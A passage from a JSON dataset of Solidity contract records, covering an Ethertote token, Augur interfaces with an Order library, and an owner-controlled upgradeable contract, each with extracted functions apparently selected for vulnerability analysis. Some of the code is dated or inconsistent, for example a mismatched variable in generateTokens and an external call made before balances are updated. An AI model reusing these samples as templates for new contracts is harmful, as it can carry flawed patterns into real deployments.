>= _amount);\n if (isContract(controller)) {\n require(TokenController(controller).onTransfer(_from, _to, _amount));\n }\n updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\n uint previousBalanceTo = balanceOfAt(_to, block.number);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(balances[_to], previousBalanceTo + _amount);\n emit Transfer(_from, _to, _amount);\n }\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData\n ) public returns (bool success) {\n require(approve(_spender, _amount));\n ApproveAndCallFallBack(_spender).receiveApproval(\n msg.sender,\n _amount,\n this,\n _extraData\n );\n return true;\n }\n function balanceOfAt(address _owner, uint _blockNumber) public constant\n returns (uint) {\n if ((balances[_owner].length == 0)\n || (balances[_owner][0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n }\n else {\n return getValueAt(balances[_owner], _blockNumber);\n }\n }\n function totalSupplyAt(uint _blockNumber) public constant returns(uint) {\n if (\n (totalSupplyHistory.length == 0) ||\n (totalSupplyHistory[0].fromBlock > _blockNumber)\n ) {\n if (address(parentToken) != 0) {\n return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n }\n else {\n return getValueAt(totalSupplyHistory, _blockNumber);\n }\n }\n function generateTokens(address _owner, uint _theTotalSupply)\n private onlyContract returns (bool) {\n require(tokenGenerationLock == false);\n uint curTotalSupply = totalSupply();\n require(curTotalSupply + _theTotalSupply >= curTotalSupply);\n uint previousBalanceTo = balanceOf(_owner);\n require(previousBalanceTo + _totalSupply >= previousBalanceTo);\n updateValueAtNow(totalSupplyHistory, curTotalSupply + _totalSupply);\n updateValueAtNow(balances[_owner], previousBalanceTo + _totalSupply);\n emit Transfer(0, _owner, _totalSupply);\n tokenGenerationLock = true;\n return true;\n }\n function enableTransfers(bool _transfersEnabled) private onlyController {\n transfersEnabled = _transfersEnabled;\n }\n function getValueAt(Checkpoint[] storage checkpoints, uint _block\n ) constant internal returns (uint) {\n if (checkpoints.length == 0) return 0;\n if (_block >= checkpoints[checkpoints.length-1].fromBlock)\n return checkpoints[checkpoints.length-1].value;\n if (_block < checkpoints[0].fromBlock) return 0;\n uint min = 0;\n uint max = checkpoints.length-1;\n while (max > min) {\n uint mid = (max + min + 1)/ 2;\n if (checkpoints[mid].fromBlock<=_block) {\n min = mid;\n } else {\n max = mid-1;\n }\n }\n return checkpoints[min].value;\n }\n function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value\n ) internal {\n if ((checkpoints.length == 0)\n || (checkpoints[checkpoints.length -1].fromBlock < block.number)) {\n Checkpoint storage newCheckPoint = checkpoints[ checkpoints.length++ ];\n newCheckPoint.fromBlock = uint128(block.number);\n newCheckPoint.value = uint128(_value);\n } else {\n Checkpoint storage oldCheckPoint = checkpoints[checkpoints.length-1];\n oldCheckPoint.value = uint128(_value);\n }\n }\n function isContract(address _addr) constant internal returns(bool) {\n uint size;\n if (_addr == 0) return false;\n assembly {\n size := extcodesize(_addr)\n }\n return size>0;\n }\n function min(uint a, uint b) pure internal returns (uint) {\n return a < b ? a : b;\n }\n function () public payable {\n require(isContract(controller));\n require(\n TokenController(controller).proxyPayments.value(msg.value)(msg.sender)\n );\n }\n event ClaimedTokens(\n address indexed _token, address indexed _controller, uint _amount\n );\n function withdrawOtherTokens(address _token) EthertoteAdmin public {\n if (_token == 0x0) {\n controller.transfer(address(this).balance);\n return;\n }\n EthertoteToken token = EthertoteToken(_token);\n uint balance = token.balanceOf(this);\n token.transfer(controller, balance);\n emit ClaimedTokens(_token, controller, balance);\n }\n}",
  "extract_feature": [
    "function totalSupply() public constant returns (uint) {\nreturn totalSupplyAt(block.number);\n}",
    "function balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balanceOfAt(_owner, block.number);\n}",
    "function doTransfer(address _from, address _to, uint _amount) internal {\nif (_amount == 0) {\nemit Transfer(_from, _to, _amount);\nreturn;\n}\nrequire(parentSnapShotBlock < block.number);\nrequire(_to != address(this));\nuint previousBalanceFrom = balanceOfAt(_from, block.number);\nrequire(previousBalanceFrom >= _amount);\nif (isContract(controller)) {\nrequire(TokenController(controller).onTransfer(_from, _to, _amount));\n}\nupdateValueAtNow(balances[_from], previousBalanceFrom - _amount);\nuint previousBalanceTo = balanceOfAt(_to, block.number);\nrequire(previousBalanceTo + _amount >= previousBalanceTo);\nupdateValueAtNow(balances[_to], previousBalanceTo + _amount);\nemit Transfer(_from, _to, _amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b81"
  },
  "filename": "3894.sol",
  "content": "pragma solidity 0.4.20;\ncontract IAugur {\n function createChildUniverse(bytes32 _parentPayoutDistributionHash, uint256[] _parentPayoutNumerators, bool _parentInvalid) public returns (IUniverse);\n function isKnownUniverse(IUniverse _universe) public view returns (bool);\n function trustedTransfer(ERC20 _token, address _from, address _to, uint256 _amount) public returns (bool);\n function logMarketCreated(bytes32 _topic, string _description, string _extraInfo, IUniverse _universe, address _market, address _marketCreator, bytes32[] _outcomes, int256 _minPrice, int256 _maxPrice, IMarket.MarketType _marketType) public returns (bool);\n function logMarketCreated(bytes32 _topic, string _description, string _extraInfo, IUniverse _universe, address _market, address _marketCreator, int256 _minPrice, int256 _maxPrice, IMarket.MarketType _marketType) public returns (bool);\n function logInitialReportSubmitted(IUniverse _universe, address _reporter, address _market, uint256 _amountStaked, bool _isDesignatedReporter, uint256[] _payoutNumerators, bool _invalid) public returns (bool);\n function disputeCrowdsourcerCreated(IUniverse _universe, address _market, address _disputeCrowdsourcer, uint256[] _payoutNumerators, uint256 _size, bool _invalid) public returns (bool);\n function logDisputeCrowdsourcerContribution(IUniverse _universe, address _reporter, address _market, address _disputeCrowdsourcer, uint256 _amountStaked) public returns (bool);\n function logDisputeCrowdsourcerCompleted(IUniverse _universe, address _market, address _disputeCrowdsourcer) public returns (bool);\n function logInitialReporterRedeemed(IUniverse _universe, address _reporter, address _market, uint256 _amountRedeemed, uint256 _repReceived, uint256 _reportingFeesReceived, uint256[] _payoutNumerators) public returns (bool);\n function logDisputeCrowdsourcerRedeemed(IUniverse _universe, address _reporter, address _market, uint256 _amountRedeemed, uint256 _repReceived, uint256 _reportingFeesReceived, uint256[] _payoutNumerators) public returns (bool);\n function logFeeWindowRedeemed(IUniverse _universe, address _reporter, uint256 _amountRedeemed, uint256 _reportingFeesReceived) public returns (bool);\n function logMarketFinalized(IUniverse _universe) public returns (bool);\n function logMarketMigrated(IMarket _market, IUniverse _originalUniverse) public returns (bool);\n function logReportingParticipantDisavowed(IUniverse _universe, IMarket _market) public returns (bool);\n function logMarketParticipantsDisavowed(IUniverse _universe) public returns (bool);\n function logOrderCanceled(IUniverse _universe, address _shareToken, address _sender, bytes32 _orderId, Order.Types _orderType, uint256 _tokenRefund, uint256 _sharesRefund) public returns (bool);\n function logOrderCreated(Order.Types _orderType, uint256 _amount, uint256 _price, address _creator, uint256 _moneyEscrowed, uint256 _sharesEscrowed, bytes32 _tradeGroupId, bytes32 _orderId, IUniverse _universe, address _shareToken) public returns (bool);\n function logOrderFilled(IUniverse _universe, address _shareToken, address _filler, bytes32 _orderId, uint256 _numCreatorShares, uint256 _numCreatorTokens, uint256 _numFillerShares, uint256 _numFillerTokens, uint256 _marketCreatorFees, uint256 _reporterFees, uint256 _amountFilled, bytes32 _tradeGroupId) public returns (bool);\n function logCompleteSetsPurchased(IUniverse _universe, IMarket _market, address _account, uint256 _numCompleteSets) public returns (bool);\n function logCompleteSetsSold(IUniverse _universe, IMarket _market, address _account, uint256 _numCompleteSets) public returns (bool);\n function logTradingProceedsClaimed(IUniverse _universe, address _shareToken, address _sender, address _market, uint256 _numShares, uint256 _numPayoutTokens, uint256 _finalTokenBalance) public returns (bool);\n function logUniverseForked() public returns (bool);\n function logFeeWindowTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);\n function logReputationTokensTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);\n function logDisputeCrowdsourcerTokensTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);\n function logShareTokensTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);\n function logReputationTokenBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logReputationTokenMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logShareTokenBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logShareTokenMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logFeeWindowBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logFeeWindowMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logDisputeCrowdsourcerTokensBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logDisputeCrowdsourcerTokensMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logFeeWindowCreated(IFeeWindow _feeWindow, uint256 _id) public returns (bool);\n function logFeeTokenTransferred(IUniverse _universe, address _from, address _to, uint256 _value) public returns (bool);\n function logFeeTokenBurned(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logFeeTokenMinted(IUniverse _universe, address _target, uint256 _amount) public returns (bool);\n function logTimestampSet(uint256 _newTimestamp) public returns (bool);\n function logInitialReporterTransferred(IUniverse _universe, IMarket _market, address _from, address _to) public returns (bool);\n function logMarketTransferred(IUniverse _universe, address _from, address _to) public returns (bool);\n function logMarketMailboxTransferred(IUniverse _universe, IMarket _market, address _from, address _to) public returns (bool);\n function logEscapeHatchChanged(bool _isOn) public returns (bool);\n}\ncontract IController {\n function assertIsWhitelisted(address _target) public view returns(bool);\n function lookup(bytes32 _key) public view returns(address);\n function stopInEmergency() public view returns(bool);\n function onlyInEmergency() public view returns(bool);\n function getAugur() public view returns (IAugur);\n function getTimestamp() public view returns (uint256);\n function emergencyStop() public returns (bool);\n}\ncontract IOwnable {\n function getOwner() public view returns (address);\n function transferOwnership(address newOwner) public returns (bool);\n}\ncontract ITyped {\n function getTypeName() public view returns (bytes32);\n}\ncontract Initializable {\n bool private initialized = false;\n modifier afterInitialized {\n require(initialized);\n _;\n }\n modifier beforeInitialized {\n require(!initialized);\n _;\n }\n function endInitialization() internal beforeInitialized returns (bool) {\n initialized = true;\n return true;\n }\n function getInitialized() public view returns (bool) {\n return initialized;\n }\n}\ncontract Ownable is IOwnable {\n address internal owner;\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function getOwner() public view returns (address) {\n return owner;\n }\n function transferOwnership(address _newOwner) public onlyOwner returns (bool) {\n if (_newOwner != address(0)) {\n onTransferOwnership(owner, _newOwner);\n owner = _newOwner;\n }\n return true;\n }\n function onTransferOwnership(address, address) internal returns (bool);\n}\ncontract EscapeHatchController is Ownable {\n IController public controller;\n function setController(IController _controller) public onlyOwner returns (bool) {\n controller = _controller;\n return true;\n }\n function emergencyStop() public onlyOwner returns (bool) {\n controller.emergencyStop();\n return true;\n }\n function onTransferOwnership(address, address) internal returns (bool) {\n return true;\n }\n}\nlibrary SafeMathUint256 {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n require(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n require(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a);\n return c;\n }\n function min(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a <= b) {\n return a;\n } else {\n return b;\n }\n }\n function max(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a >= b) {\n return a;\n } else {\n return b;\n }\n }\n function getUint256Min() internal pure returns (uint256) {\n return 0;\n }\n function getUint256Max() internal pure returns (uint256) {\n return 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n }\n function isMultipleOf(uint256 a, uint256 b) internal pure returns (bool) {\n return a % b == 0;\n }\n function fxpMul(uint256 a, uint256 b, uint256 base) internal pure returns (uint256) {\n return div(mul(a, b), base);\n }\n function fxpDiv(uint256 a, uint256 b, uint256 base) internal pure returns (uint256) {\n return div(mul(a, base), b);\n }\n}\ncontract ERC20Basic {\n event Transfer(address indexed from, address indexed to, uint256 value);\n function balanceOf(address _who) public view returns (uint256);\n function transfer(address _to, uint256 _value) public returns (bool);\n function totalSupply() public view returns (uint256);\n}\ncontract ERC20 is ERC20Basic {\n event Approval(address indexed owner, address indexed spender, uint256 value);\n function allowance(address _owner, address _spender) public view returns (uint256);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool);\n function approve(address _spender, uint256 _value) public returns (bool);\n}\ncontract IFeeToken is ERC20, Initializable {\n function initialize(IFeeWindow _feeWindow) public returns (bool);\n function getFeeWindow() public view returns (IFeeWindow);\n function feeWindowBurn(address _target, uint256 _amount) public returns (bool);\n function mintForReportingParticipant(address _target, uint256 _amount) public returns (bool);\n}\ncontract IFeeWindow is ITyped, ERC20 {\n function initialize(IUniverse _universe, uint256 _feeWindowId) public returns (bool);\n function getUniverse() public view returns (IUniverse);\n function getReputationToken() public view returns (IReputationToken);\n function getStartTime() public view returns (uint256);\n function getEndTime() public view returns (uint256);\n function getNumMarkets() public view returns (uint256);\n function getNumInvalidMarkets() public view returns (uint256);\n function getNumIncorrectDesignatedReportMarkets() public view returns (uint256);\n function getNumDesignatedReportNoShows() public view returns (uint256);\n function getFeeToken() public view returns (IFeeToken);\n function isActive() public view returns (bool);\n function isOver() public view returns (bool);\n function onMarketFinalized() public returns (bool);\n function buy(uint256 _attotokens) public returns (bool);\n function redeem(address _sender) public returns (bool);\n function redeemForReportingParticipant() public returns (bool);\n function mintFeeTokens(uint256 _amount) public returns (bool);\n function trustedUniverseBuy(address _buyer, uint256 _attotokens) public returns (bool);\n}\ncontract IMailbox {\n function initialize(address _owner, IMarket _market) public returns (bool);\n function depositEther() public payable returns (bool);\n}\ncontract IMarket is ITyped, IOwnable {\n enum MarketType {\n YES_NO,\n CATEGORICAL,\n SCALAR\n }\n function initialize(IUniverse _universe, uint256 _endTime, uint256 _feePerEthInAttoeth, ICash _cash, address _designatedReporterAddress, address _creator, uint256 _numOutcomes, uint256 _numTicks) public payable returns (bool _success);\n function derivePayoutDistributionHash(uint256[] _payoutNumerators, bool _invalid) public view returns (bytes32);\n function getUniverse() public view returns (IUniverse);\n function getFeeWindow() public view returns (IFeeWindow);\n function getNumberOfOutcomes() public view returns (uint256);\n function getNumTicks() public view returns (uint256);\n function getDenominationToken() public view returns (ICash);\n function getShareToken(uint256 _outcome) public view returns (IShareToken);\n function getMarketCreatorSettlementFeeDivisor() public view returns (uint256);\n function getForkingMarket() public view returns (IMarket _market);\n function getEndTime() public view returns (uint256);\n function getMarketCreatorMailbox() public view returns (IMailbox);\n function getWinningPayoutDistributionHash() public view returns (bytes32);\n function getWinningPayoutNumerator(uint256 _outcome) public view returns (uint256);\n function getReputationToken() public view returns (IReputationToken);\n function getFinalizationTime() public view returns (uint256);\n function getInitialReporterAddress() public view returns (address);\n function deriveMarketCreatorFeeAmount(uint256 _amount) public view returns (uint256);\n function isContainerForShareToken(IShareToken _shadyTarget) public view returns (bool);\n function isContainerForReportingParticipant(IReportingParticipant _reportingParticipant) public view returns (bool);\n function isInvalid() public view returns (bool);\n function finalize() public returns (bool);\n function designatedReporterWasCorrect() public view returns (bool);\n function designatedReporterShowed() public view returns (bool);\n function isFinalized() public view returns (bool);\n function finalizeFork() public returns (bool);\n function assertBalances() public view returns (bool);\n}\ncontract IReportingParticipant {\n function getStake() public view returns (uint256);\n function getPayoutDistributionHash() public view returns (bytes32);\n function liquidateLosing() public returns (bool);\n function redeem(address _redeemer) public returns (bool);\n function isInvalid() public view returns (bool);\n function isDisavowed() public view returns (bool);\n function migrate() public returns (bool);\n function getPayoutNumerator(uint256 _outcome) public view returns (uint256);\n function getMarket() public view returns (IMarket);\n function getSize() public view returns (uint256);\n}\ncontract IDisputeCrowdsourcer is IReportingParticipant, ERC20 {\n function initialize(IMarket market, uint256 _size, bytes32 _payoutDistributionHash, uint256[] _payoutNumerators, bool _invalid) public returns (bool);\n function contribute(address _participant, uint256 _amount) public returns (uint256);\n}\ncontract IReputationToken is ITyped, ERC20 {\n function initialize(IUniverse _universe) public returns (bool);\n function migrateOut(IReputationToken _destination, uint256 _attotokens) public returns (bool);\n function migrateIn(address _reporter, uint256 _attotokens) public returns (bool);\n function trustedReportingParticipantTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);\n function trustedMarketTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);\n function trustedFeeWindowTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);\n function trustedUniverseTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);\n function getUniverse() public view returns (IUniverse);\n function getTotalMigrated() public view returns (uint256);\n function getTotalTheoreticalSupply() public view returns (uint256);\n function mintForReportingParticipant(uint256 _amountMigrated) public returns (bool);\n}\ncontract IUniverse is ITyped {\n function initialize(IUniverse _parentUniverse, bytes32 _parentPayoutDistributionHash) external returns (bool);\n function fork() public returns (bool);\n function getParentUniverse() public view returns (IUniverse);\n function createChildUniverse(uint256[] _parentPayoutNumerators, bool _invalid) public returns (IUniverse);\n function getChildUniverse(bytes32 _parentPayoutDistributionHash) public view returns (IUniverse);\n function getReputationToken() public view returns (IReputationToken);\n function getForkingMarket() public view returns (IMarket);\n function getForkEndTime() public view returns (uint256);\n function getForkReputationGoal() public view returns (uint256);\n function getParentPayoutDistributionHash() public view returns (bytes32);\n function getDisputeRoundDurationInSeconds() public view returns (uint256);\n function getOrCreateFeeWindowByTimestamp(uint256 _timestamp) public returns (IFeeWindow);\n function getOrCreateCurrentFeeWindow() public returns (IFeeWindow);\n function getOrCreateNextFeeWindow() public returns (IFeeWindow);\n function getOpenInterestInAttoEth() public view returns (uint256);\n function getRepMarketCapInAttoeth() public view returns (uint256);\n function getTargetRepMarketCapInAttoeth() public view returns (uint256);\n function getOrCacheValidityBond() public returns (uint256);\n function getOrCacheDesignatedReportStake() public returns (uint256);\n function getOrCacheDesignatedReportNoShowBond() public returns (uint256);\n function getOrCacheReportingFeeDivisor() public returns (uint256);\n function getDisputeThresholdForFork() public view returns (uint256);\n function getInitialReportMinValue() public view returns (uint256);\n function calculateFloatingValue(uint256 _badMarkets, uint256 _totalMarkets, uint256 _targetDivisor, uint256 _previousValue, uint256 _defaultValue, uint256 _floor) public pure returns (uint256 _newValue);\n function getOrCacheMarketCreationCost() public returns (uint256);\n function getCurrentFeeWindow() public view returns (IFeeWindow);\n function getOrCreateFeeWindowBefore(IFeeWindow _feeWindow) public returns (IFeeWindow);\n function isParentOf(IUniverse _shadyChild) public view returns (bool);\n function updateTentativeWinningChildUniverse(bytes32 _parentPayoutDistributionHash) public returns (bool);\n function isContainerForFeeWindow(IFeeWindow _shadyTarget) public view returns (bool);\n function isContainerForMarket(IMarket _shadyTarget) public view returns (bool);\n function isContainerForReportingParticipant(IReportingParticipant _reportingParticipant) public view returns (bool);\n function isContainerForShareToken(IShareToken _shadyTarget) public view returns (bool);\n function isContainerForFeeToken(IFeeToken _shadyTarget) public view returns (bool);\n function addMarketTo() public returns (bool);\n function removeMarketFrom() public returns (bool);\n function decrementOpenInterest(uint256 _amount) public returns (bool);\n function decrementOpenInterestFromMarket(uint256 _amount) public returns (bool);\n function incrementOpenInterest(uint256 _amount) public returns (bool);\n function incrementOpenInterestFromMarket(uint256 _amount) public returns (bool);\n function getWinningChildUniverse() public view returns (IUniverse);\n function isForking() public view returns (bool);\n}\ncontract ICash is ERC20 {\n function depositEther() external payable returns(bool);\n function depositEtherFor(address _to) external payable returns(bool);\n function withdrawEther(uint256 _amount) external returns(bool);\n function withdrawEtherTo(address _to, uint256 _amount) external returns(bool);\n function withdrawEtherToIfPossible(address _to, uint256 _amount) external returns (bool);\n}\ncontract IOrders {\n function saveOrder(Order.Types _type, IMarket _market, uint256 _fxpAmount, uint256 _price, address _sender, uint256 _outcome, uint256 _moneyEscrowed, uint256 _sharesEscrowed, bytes32 _betterOrderId, bytes32 _worseOrderId, bytes32 _tradeGroupId) public returns (bytes32 _orderId);\n function removeOrder(bytes32 _orderId) public returns (bool);\n function getMarket(bytes32 _orderId) public view returns (IMarket);\n function getOrderType(bytes32 _orderId) public view returns (Order.Types);\n function getOutcome(bytes32 _orderId) public view returns (uint256);\n function getAmount(bytes32 _orderId) public view returns (uint256);\n function getPrice(bytes32 _orderId) public view returns (uint256);\n function getOrderCreator(bytes32 _orderId) public view returns (address);\n function getOrderSharesEscrowed(bytes32 _orderId) public view returns (uint256);\n function getOrderMoneyEscrowed(bytes32 _orderId) public view returns (uint256);\n function getBetterOrderId(bytes32 _orderId) public view returns (bytes32);\n function getWorseOrderId(bytes32 _orderId) public view returns (bytes32);\n function getBestOrderId(Order.Types _type, IMarket _market, uint256 _outcome) public view returns (bytes32);\n function getWorstOrderId(Order.Types _type, IMarket _market, uint256 _outcome) public view returns (bytes32);\n function getLastOutcomePrice(IMarket _market, uint256 _outcome) public view returns (uint256);\n function getOrderId(Order.Types _type, IMarket _market, uint256 _fxpAmount, uint256 _price, address _sender, uint256 _blockNumber, uint256 _outcome, uint256 _moneyEscrowed, uint256 _sharesEscrowed) public pure returns (bytes32);\n function getTotalEscrowed(IMarket _market) public view returns (uint256);\n function isBetterPrice(Order.Types _type, uint256 _price, bytes32 _orderId) public view returns (bool);\n function isWorsePrice(Order.Types _type, uint256 _price, bytes32 _orderId) public view returns (bool);\n function assertIsNotBetterPrice(Order.Types _type, uint256 _price, bytes32 _betterOrderId) public view returns (bool);\n function assertIsNotWorsePrice(Order.Types _type, uint256 _price, bytes32 _worseOrderId) public returns (bool);\n function recordFillOrder(bytes32 _orderId, uint256 _sharesFilled, uint256 _tokensFilled) public returns (bool);\n function setPrice(IMarket _market, uint256 _outcome, uint256 _price) external returns (bool);\n function incrementTotalEscrowed(IMarket _market, uint256 _amount) external returns (bool);\n function decrementTotalEscrowed(IMarket _market, uint256 _amount) external returns (bool);\n}\ncontract IShareToken is ITyped, ERC20 {\n function initialize(IMarket _market, uint256 _outcome) external returns (bool);\n function createShares(address _owner, uint256 _amount) external returns (bool);\n function destroyShares(address, uint256 balance) external returns (bool);\n function getMarket() external view returns (IMarket);\n function getOutcome() external view returns (uint256);\n function trustedOrderTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);\n function trustedFillOrderTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);\n function trustedCancelOrderTransfer(address _source, address _destination, uint256 _attotokens) public returns (bool);\n}\nlibrary Order {\n using SafeMathUint256 for uint256;\n enum Types {\n Bid, Ask\n }\n enum TradeDirections {\n Long, Short\n }\n struct Data {\n IOrders orders;\n IMarket market;\n IAugur augur;\n bytes32 id;\n address creator;\n uint256 outcome;\n Order.Types orderType;\n uint256 amount;\n uint256 price;\n uint256 sharesEscrowed;\n uint256 moneyEscrowed;\n bytes32 betterOrderId;\n bytes32 worseOrderId;\n }\n function create(IController _controller, address _creator, uint256 _outcome, Order.Types _type, uint256 _attoshares, uint256 _price, IMarket _market, bytes32 _betterOrderId, bytes32 _worseOrderId) internal view returns (Data) {\n require(_outcome < _market.getNumberOfOutcomes());\n require(_price < _market.getNumTicks());\n IOrders _orders = IOrders(_controller.lookup(\"Orders\"));\n IAugur _augur = _controller.getAugur();\n return Data({\n orders: _orders,\n market: _market,\n augur: _augur,\n id: 0,\n creator: _creator,\n outcome: _outcome,\n orderType: _type,\n amount: _attoshares,\n price: _price,\n sharesEscrowed: 0,\n moneyEscrowed: 0,\n betterOrderId: _betterOrderId,\n worseOrderId: _worseOrderId\n });\n }\n function getOrderId(Order.Data _orderData) internal view returns (bytes32) {\n if (_orderData.id == bytes32(0)) {\n bytes32 _orderId = _orderData.orders.getOrderId(_orderData.orderType, _orderData.market, _orderData.amount, _orderData.price, _orderData.creator, block.number, _orderData.outcome, _orderData.moneyEscrowed, _orderData.sharesEscrowed);\n require(_orderData.orders.getAmount(_orderId) == 0);\n _orderData.id = _orderId;\n }\n return _orderData.id;\n }\n function getOrderTradingTypeFromMakerDirection(Order.TradeDirections _creatorDirection) internal pure returns (Order.Types) {\n return (_creatorDirection == Order.TradeDirections.Long) ? Order.Types.Bid : Order.Types.Ask;\n }\n function getOrderTradingTypeFromFillerDirection(Order.TradeDirections _fillerDirection) internal pure returns (Order.Types) {\n return (_fillerDirection == Order.TradeDirections.Long) ? Order.Types.Ask : Order.Types.Bid;\n }\n function escrowFunds(Order.Data _orderData) internal returns (bool) {\n if (_orderData.orderType == Order.Types.Ask) {\n return escrowFundsForAsk(_orderData);\n } else if (_orderData.orderType == Order.Types.Bid) {\n return escrowFundsForBid(_orderData);\n }\n }\n function saveOrder(Order.Data _orderData, bytes32 _tradeGroupId) internal returns (bytes32) {\n return _orderData.orders.saveOrder(_orderData.orderType, _orderData.market, _orderData.amount, _orderData.price, _orderData.creator, _orderData.outcome, _orderData.moneyEscrowed, _orderData.sharesEscrowed, _orderData.betterOrderId, _orderData.worseOrderId, _tradeGroupId);\n }\n function escrowFundsForBid(Order.Data _orderData) private returns (bool) {\n require(_orderData.moneyEscrowed == 0);\n require(_orderData.sharesEscrowed == 0);\n uint256 _attosharesToCover = _orderData.amount;\n uint256 _numberOfOutcomes = _orderData.market.getNumberOfOutcomes();\n uint256 _attosharesHeld = 2**254;\n for (uint256 _i = 0; _i < _numberOfOutcomes; _i++) {\n if (_i != _orderData.outcome) {\n uint256 _creatorShareTokenBalance = _orderData.market.getShareToken(_i).balanceOf(_orderData.creator);\n _attosharesHeld = SafeMathUint256.min(_creatorShareTokenBalance, _attosharesHeld);\n }\n }\n if (_attosharesHeld > 0) {\n _orderData.sharesEscrowed = SafeMathUint256.min(_attosharesHeld, _attosharesToCover);\n _attosharesToCover -= _orderData.sharesEscrowed;\n for (_i = 0; _i < _numberOfOutcomes; _i++) {\n if (_i != _orderData.outcome) {\n _orderData.market.getShareToken(_i).trustedOrderTransfer(_orderData.creator, _orderData.market, _orderData.sharesEscrowed);\n }\n }\n }\n if (_attosharesToCover > 0) {\n _orderData.moneyEscrowed = _attosharesToCover.mul(_orderData.price);\n require(_orderData.augur.trustedTransfer(_orderData.market.getDenominationToken(), _orderData.creator, _orderData.market, _orderData.moneyEscrowed));\n }\n return true;\n }\n function escrowFundsForAsk(Order.Data _orderData) private returns (bool) {\n require(_orderData.moneyEscrowed == 0);\n require(_orderData.sharesEscrowed == 0);\n IShareToken _shareToken = _orderData.market.getShareToken(_orderData.outcome);\n uint256 _attosharesToCover = _orderData.amount;\n uint256 _attosharesHeld = _shareToken.balanceOf(_orderData.creator);\n if (_attosharesHeld > 0) {\n _orderData.sharesEscrowed = SafeMathUint256.min(_attosharesHeld, _attosharesToCover);\n _attosharesToCover -= _orderData.sharesEscrowed;\n _shareToken.trustedOrderTransfer(_orderData.creator, _orderData.market, _orderData.sharesEscrowed);\n }\n if (_attosharesToCover > 0) {\n _orderData.moneyEscrowed = _orderData.market.getNumTicks().sub(_orderData.price).mul(_attosharesToCover);\n require(_orderData.augur.trustedTransfer(_orderData.market.getDenominationToken(), _orderData.creator, _orderData.market, _orderData.moneyEscrowed));\n }\n return true;\n }\n}",
  "extract_feature": [
    "function getOrderId(Order.Data _orderData) internal view returns (bytes32) {\nif (_orderData.id == bytes32(0)) {\nbytes32 _orderId = _orderData.orders.getOrderId(_orderData.orderType, _orderData.market, _orderData.amount, _orderData.price, _orderData.creator, block.number, _orderData.outcome, _orderData.moneyEscrowed, _orderData.sharesEscrowed);\nrequire(_orderData.orders.getAmount(_orderId) == 0);\n_orderData.id = _orderId;\n}\nreturn _orderData.id;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b82"
  },
  "filename": "3936.sol",
  "content": "pragma solidity 0.4.21;\ncontract ERC20Interface {\n uint public totalSupply;\n function balanceOf(address tokenOwner) public constant returns (uint balance);\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\ncontract Ownable {\n address public owner;\n function Ownable() public {\n owner = msg.sender;\n }\n function changeOwner(address newOwner) public ownerOnly {\n require(newOwner != address(0));\n owner = newOwner;\n }\n modifier ownerOnly() {\n require(msg.sender == owner);\n _;\n }\n}\ncontract Upgradeable is Ownable{\n address public lastContract;\n address public nextContract;\n bool public isOldVersion;\n bool public allowedToUpgrade;\n function Upgradeable() public {\n allowedToUpgrade = true;\n }\n function upgradeTo(Upgradeable newContract) public ownerOnly{\n require(allowedToUpgrade && !isOldVersion);\n nextContract = newContract;\n isOldVersion = true;\n newContract.confirmUpgrade();\n }\n function confirmUpgrade() public {\n require(lastContract == address(0));\n lastContract = msg.sender;\n }\n}\ncontract EmergencySafe is Ownable{\n event PauseToggled(bool isPaused);\n bool public paused;\n modifier isNotPaused() {\n require(!paused);\n _;\n }\n modifier isPaused() {\n require(paused);\n _;\n }\n function EmergencySafe() public {\n paused = false;\n }\n function emergencyERC20Drain(ERC20Interface token, uint amount) public ownerOnly{\n token.transfer(owner, amount);\n }\n function emergencyEthDrain(uint amount) public ownerOnly returns (bool){\n return owner.send(amount);\n }\n function togglePause() public ownerOnly {\n paused = !paused;\n emit PauseToggled(paused);\n 